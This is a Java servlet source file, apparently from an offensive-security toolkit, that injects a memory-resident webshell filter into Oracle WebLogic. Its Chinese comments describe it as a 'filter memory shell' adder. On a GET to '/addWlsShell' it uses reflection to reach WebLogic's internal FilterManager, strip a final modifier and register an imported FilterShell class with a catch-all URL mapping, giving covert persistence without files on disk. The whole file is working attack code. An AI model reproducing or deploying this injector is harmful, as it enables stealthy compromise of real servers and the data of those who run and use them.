package cn.safe6.action;

import cn.safe6.filter.FilterShell;
import weblogic.servlet.internal.FilterWrapper;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;
import weblogic.servlet.utils.URLMapping;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.EnumSet;
import java.util.List;
import java.util.Map;

/**
 * Filter内存马添加,适用于weblogic
 */
@WebServlet("/addWlsShell")
public class AddShellWeblogicFilter extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        try {
            //先拿到Context
            weblogic.servlet.internal.WebAppServletContext context = (weblogic.servlet.internal.WebAppServletContext) req.getServletContext();
            Field filterManagerField =context.getClass().getDeclaredField("filterManager");
            filterManagerField.setAccessible(true);

            weblogic.servlet.internal.FilterManager filterManager=  (weblogic.servlet.internal.FilterManager)filterManagerField.get(context);
            //filterManager.getFilterChain().add();

            Field filtersField=filterManager.getClass().getDeclaredField("filters");
            filtersField.setAccessible(true);

            //final
            Field filterPatternListField= filterManager.getClass().getDeclaredField("filterPatternList");
            filterPatternListField.setAccessible(true);
            Field modifiers = filterPatternListField.getClass().getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(filterPatternListField,filterPatternListField.getModifiers() & ~Modifier.FINAL);

            //准备filter马
            FilterShell filterShell = new FilterShell();

            //获取filters
            Map<String, FilterWrapper> filterWrapperMap = (Map<String, FilterWrapper>) filtersField.get(filterManager);

            //用wrapper包装filter
            Class<?> clz = Class.forName("weblogic.servlet.internal.FilterWrapper");

            Constructor constructor = clz.getDeclaredConstructor(String.class,String.class,Map.class,WebAppServletContext.class);
            constructor.setAccessible(true);

            FilterWrapper filterWrapper = (FilterWrapper) constructor.newInstance(filterShell.getClass().getName(),filterShell.getClass().getName(),null,context);

            //添加到filters
            filterWrapperMap.put(filterShell.getClass().getName(),filterWrapper);

            //添加映射
            List filterInfos = (List) filterPatternListField.get(filterManager);
            Class<?> fiz = Class.forName("weblogic.servlet.internal.FilterManager$FilterInfo");
            Constructor constructor1 = fiz.getDeclaredConstructor(String.class, URLMapping.class,WebAppServletContext.class, EnumSet.class);
            constructor1.setAccessible(true);
            filterInfos.add(constructor1.newInstance(filterShell.getClass().getName(),new ServletMapping(),context,null));


            resp.getWriter().write("add success!");
            return;

        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add failed!");

    }
}
